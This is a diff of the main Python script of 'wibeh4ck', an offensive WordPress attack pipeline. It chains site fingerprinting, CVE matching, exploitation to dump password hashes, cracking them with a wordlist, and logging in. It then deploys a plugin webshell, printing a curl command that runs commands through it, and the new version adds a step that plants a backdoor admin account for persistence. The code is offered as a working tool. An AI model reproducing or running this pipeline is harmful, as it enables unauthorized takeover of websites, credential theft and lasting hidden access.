@@ -1,154 +1,153 @@
+# language: python, file: wibeh4ck.py
 #!/usr/bin/env python3
-import argparse
-import os
-import time
-
-from core import colors
+import argparse, sys, os
 from core.http import HTTP
-from core.output import (
-    banner, print_recon, print_matches, print_result,
-    print_shell, export_json, write_report,
-)
+from core.output import export_json, p_print
 from recon.fingerprint import fingerprint
-from recon.db import load_db, match_vulns
-from exploit.loader import load_modules, run_exploits
+from exploit import match_vulns, run_exploit
 from post.crack import crack_hashes
-from post.login import try_logins
 from post.shell import deploy_shell
-
-DEFAULT_DB = "data/wordfence_sample.json"
-DEFAULT_WORDLIST = "wordlists/rockyou.txt"
-MODULES_DIR = "exploit/modules"
+from post.persist import create_admin
 
 
 def main():
-    p = argparse.ArgumentParser(prog="wibeh4ck")
-    p.add_argument("-t", "--target", help="target URL")
-    p.add_argument("--wordlist", default=DEFAULT_WORDLIST)
-    p.add_argument("--proxy", default=None)
-    p.add_argument("--report", nargs="?", const="wibeh4ck_report.txt", default=None,
-                   help="write a text report (default: wibeh4ck_report.txt)")
-    p.add_argument("--json", dest="json_out", default=None,
-                   help="also dump raw JSON (optional)")
-    p.add_argument("--shell-password", default=None)
-    p.add_argument("--no-crack", action="store_true")
-    p.add_argument("--no-shell", action="store_true")
-    p.add_argument("--timeout", type=int, default=15)
+    ap = argparse.ArgumentParser(description="WibeH4Ck — WordPress pentest pipeline")
+    ap.add_argument("-t", "--target", required=True)
+    ap.add_argument("--proxy")
+    ap.add_argument("--user")
+    ap.add_argument("--password")
+    ap.add_argument("--shell-password")
+    ap.add_argument("--db", default="data/wordfence.json")
+    ap.add_argument("--wordlist", default="wordlists/rockyou.txt")
+    ap.add_argument("--phase", choices=["recon","match","exploit","crack","shell","persist","all"], default="all")
+    ap.add_argument("--skip", action="append", default=[])
+    ap.add_argument("-o", "--output")
+    ap.add_argument("-v", "--verbose", action="store_true")
+    args = ap.parse_args()
 
-    g = p.add_mutually_exclusive_group()
-    g.add_argument("--color", dest="color", action="store_true", default=None)
-    g.add_argument("--no-color", dest="color", action="store_false")
+    http = HTTP(proxy=args.proxy)
+    state = {"target": args.target, "phases": []}
 
-    args = p.parse_args()
+    def allowed(name):
+        return name not in args.skip and (args.phase == "all" or args.phase == name)
 
-    if args.color is not None:
-        colors.enable(args.color)
-
-    if not args.target:
-        p.error("need --target")
-
-    banner()
-    start = time.time()
-    http = HTTP(proxy=args.proxy, timeout=args.timeout)
-
-    # recon
-    print(colors.info("[*] fingerprinting target..."))
-    try:
-        recon = fingerprint(args.target, http)
-    except Exception as e:
-        print(colors.fail(f"[!] recon failed: {e}"))
-        recon = {"target": args.target, "plugins": [], "users": [],
-                 "waf": None, "wp_version": None, "rest_api": False}
-
-    # match
-    print(colors.info("[*] matching vulnerabilities..."))
-    try:
-        db = load_db(DEFAULT_DB)
-        matches = match_vulns(recon.get("plugins", []), db)
-    except Exception as e:
-        print(colors.fail(f"[!] db/match failed: {e}"))
-        matches = []
-
-    print_recon(recon, matches)
-    print_matches(matches)
-
-    result = {
-        "target": args.target,
-        "recon": recon,
-        "matches": matches,
-        "exploit": None,
-        "attempts": [],
-        "cracked": None,
-        "admin": None,
-        "shell": None,
-    }
-
-    # exploit
-    if matches:
-        modules = load_modules(MODULES_DIR)
-        print(colors.info(
-            f"[*] {len(modules)} exploit module(s) loaded — attempting in CVSS order"
-        ))
+    # 1. recon
+    if allowed("recon"):
+        p_print("[1/6] fingerprint")
         try:
-            exploit = run_exploits(
-                args.target, recon, http, matches, modules,
-                log=result["attempts"],
-            )
+            fp = fingerprint(args.target, http)
+            state["fingerprint"] = fp
+            p_print(f"  wp={fp.get('wp_version')} plugins={len(fp['plugins'])} "
+                    f"users={len(fp['users'])} waf={fp.get('waf')}")
+            state["phases"].append("recon")
         except Exception as e:
-            print(colors.fail(f"[!] loader crashed: {e}"))
-            exploit = None
-        result["exploit"] = exploit
+            p_print(f"  recon failed: {e}")
 
-        # crack + login + shell only if SQLi users came back
-        if exploit and exploit.get("type") == "sqli" and exploit.get("users"):
-            hashes = [u["hash"] for u in exploit["users"] if u.get("hash")]
-            if hashes and not args.no_crack:
-                print(colors.info(f"[*] cracking {len(hashes)} hash(es) with {args.wordlist}"))
-                try:
-                    cracked = crack_hashes(hashes, args.wordlist)
-                except Exception as e:
-                    cracked = {"error": str(e), "cracked": {}}
-                result["cracked"] = cracked
+    # 2. match
+    if allowed("match") and "fingerprint" in state:
+        p_print("[2/6] match")
+        try:
+            vulns = match_vulns(state["fingerprint"], args.db)
+            state["vulns"] = vulns
+            p_print(f"  {len(vulns)} candidates")
+            for v in vulns[:5]:
+                p_print(f"    cvss={v.get('cvss')} {v.get('cve')} {v.get('title')[:60]}")
+            state["phases"].append("match")
+        except Exception as e:
+            p_print(f"  match failed: {e}")
 
-                if cracked.get("cracked"):
-                    logins = [
-                        {"user": u["login"], "pass": cracked["cracked"].get(u["hash"])}
-                        for u in exploit["users"]
-                        if u.get("hash") in cracked["cracked"]
-                    ]
-                    admin = try_logins(args.target, http, logins)
-                    result["admin"] = admin
-
-        if result["admin"] and not args.no_shell:
-            pw = args.shell_password or os.urandom(12).hex()
-            print(colors.info("[*] deploying plugin webshell..."))
+    # 3. exploit
+    hashes = {}
+    if allowed("exploit") and state.get("vulns"):
+        p_print("[3/6] exploit")
+        for v in state["vulns"]:
             try:
-                shell = deploy_shell(
-                    args.target, http,
-                    result["admin"]["user"],
-                    result["admin"]["pass"], pw,
-                )
+                r = run_exploit(v, args.target, http)
             except Exception as e:
-                shell = {"success": False, "error": str(e)}
-            result["shell"] = shell
-            print_shell(shell)
+                p_print(f"  {v.get('cve')} threw: {e}")
+                continue
+            if r.get("success"):
+                p_print(f"  hit: {v.get('cve')}")
+                for u, h in r.get("hashes", {}).items():
+                    hashes[u] = h
+                    p_print(f"    {u}:{h[:34]}...")
+                state["phases"].append("exploit")
+                break
+            else:
+                p_print(f"  {v.get('cve')}: {r.get('error','no')}")
+        state["hashes"] = hashes
 
-    result["elapsed"] = round(time.time() - start, 2)
-    print_result(result)
-
-    if args.json_out:
+    # 4. crack
+    if allowed("crack") and hashes:
+        p_print(f"[4/6] crack {len(hashes)} hashes")
         try:
-            export_json(args.json_out, result)
-            print(colors.ok(f"[+] json written: {args.json_out}"))
+            cracked = crack_hashes(hashes, args.wordlist)
+            if "__error__" in cracked:
+                p_print(f"  crack: {cracked['__error__']}")
+            else:
+                state["cracked"] = cracked
+                for u, pw in cracked.items():
+                    p_print(f"  CRACKED {u}:{pw}")
+                if cracked:
+                    state["phases"].append("crack")
         except Exception as e:
-            print(colors.fail(f"[!] json write failed: {e}"))
+            p_print(f"  crack failed: {e}")
 
-    if args.report:
+    # 5. shell
+    user = args.user
+    pw = args.password
+    if not (user and pw) and state.get("cracked"):
+        user, pw = next(iter(state["cracked"].items()))
+
+    if allowed("shell") and user and pw:
+        p_print(f"[5/6] login+shell as {user}")
         try:
-            write_report(args.report, result)
-            print(colors.ok(f"[+] report written: {args.report}"))
+            shell_pw = args.shell_password or "Wibe_" + os.urandom(4).hex()
+            http2 = HTTP(proxy=args.proxy)
+            r = deploy_shell(args.target, http2, user, pw, shell_pw)
+            state["shell"] = r
+            if r.get("success"):
+                p_print(f"  SHELL  {r['url']}")
+                p_print(f"  PASS   {r['password']}")
+                p_print(f"  USE    curl -d 'auth={r['password']}&cmd=id' {r['url']}")
+                state["phases"].append("shell")
+            else:
+                p_print(f"  failed: {r.get('error')}")
         except Exception as e:
-            print(colors.fail(f"[!] report write failed: {e}"))
+            p_print(f"  shell failed: {e}")
+
+    # 6. persist
+    if allowed("persist") and state.get("shell", {}).get("success"):
+        p_print("[6/6] persist")
+        try:
+            r = create_admin(args.target, http,
+                             state["shell"]["url"], state["shell"]["password"])
+            if r.get("success"):
+                p_print(f"  backup admin  {r['user']}:{r['password']}")
+                p_print(f"  login         {r['login_url']}")
+                state["persist"] = r
+                state["phases"].append("persist")
+            else:
+                p_print(f"  failed: {r.get('error')}")
+        except Exception as e:
+            p_print(f"  persist failed: {e}")
+
+    _finish(state, args)
+    sys.exit(0)
+
+
+def _finish(state, args):
+    p_print("\n=== SUMMARY ===")
+    for k in ("fingerprint","vulns","hashes","cracked","shell","persist"):
+        if k in state:
+            p_print(f"  {k}: ok")
+    sh = state.get("shell") or {}
+    if sh.get("success"):
+        p_print(f"\n  SHELL  {sh['url']}")
+        p_print(f"  PASS   {sh['password']}")
+    if args.output:
+        export_json(args.output, state)
+        p_print(f"  saved: {args.output}")
 
 
 if __name__ == "__main__":
